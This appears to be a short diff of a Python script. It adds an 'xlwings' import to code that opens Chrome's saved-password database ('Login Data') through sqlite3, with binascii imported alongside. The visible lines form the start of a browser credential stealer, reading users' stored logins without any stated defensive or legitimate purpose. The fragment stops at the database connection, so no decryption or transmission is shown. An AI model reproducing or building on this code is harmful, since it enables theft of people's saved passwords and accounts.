@@ -1,5 +1,6 @@
 from os import getenv
 import sqlite3
+import  xlwings as wm
 
 import binascii
 conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
